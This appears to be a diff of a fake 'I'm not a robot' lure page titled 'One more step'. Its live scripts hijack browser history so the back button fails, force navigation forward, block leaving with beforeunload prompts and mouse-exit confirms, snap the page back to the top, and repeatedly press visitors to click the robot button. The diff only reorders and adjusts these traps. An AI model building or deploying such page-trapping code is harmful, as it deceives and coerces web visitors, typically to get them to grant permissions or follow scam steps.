@@ -5,15 +5,13 @@
 <meta content='notranslate' name='google'/>
 <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
 <title>One more step</title>
-<script>
-window.addEventListener('beforeunload', (event) => { event.preventDefault(); event.returnValue = ''; });
-</script>
+
 <script>
 if(sessionStorage["click"]) { } else { ! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); }); } } catch (o) {} }(); }
 </script>
 
 <script>
-if(sessionStorage["click"]) { window.history.forward(); function preventBack() { window.history.forward(); } setTimeout("preventBack()", 0); } else { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); alert("Please click I'm not a robot button to continue !"); setTimeout(function scroll() { window.scrollTo(0, 0); }, 200); }); }
+if(sessionStorage["click"]) { window.history.forward(); function preventBack() { window.history.forward(); } setTimeout("preventBack()", 0); } else { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); alert("Please click I'm not a robot button to continue !"); setTimeout(function scroll() { window.scrollTo(0, 0); }, 0); setTimeout(function scrollB() { window.scrollTo(0, 0); }, 100); }); }
 </script>
 
 <script>
@@ -22,6 +20,10 @@ if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kin
 
 <script>
 if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/)) { if(sessionStorage["click"]) { } else { window.addEventListener("load", function() { setTimeout(function alert() { if(confirm("Please click I'm not a robot button to continue !")) { } else { } }, 100) }); } } else if (navigator.userAgent.match(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i)) { if(sessionStorage["click"]) { } else { window.addEventListener("load", function() { setTimeout(function alert() { if(confirm("Please click I'm not a robot button to continue !")) { } else { } }, 100) }); } } else { var mouseY = 0; var topValue = 0; window.addEventListener("mouseout",function(e){ mouseY = e.clientY; if(mouseY<topValue) { if(confirm("Please do not leave the page and click I'm not a robot button to continue !")); setTimeout(function scroll() { window.scrollTo(0, 0); }, 200); } }, false); }
+</script>
+
+<script>
+window.addEventListener('beforeunload', (event) => { event.preventDefault(); event.returnValue = ''; });
 </script>
 
 <style>
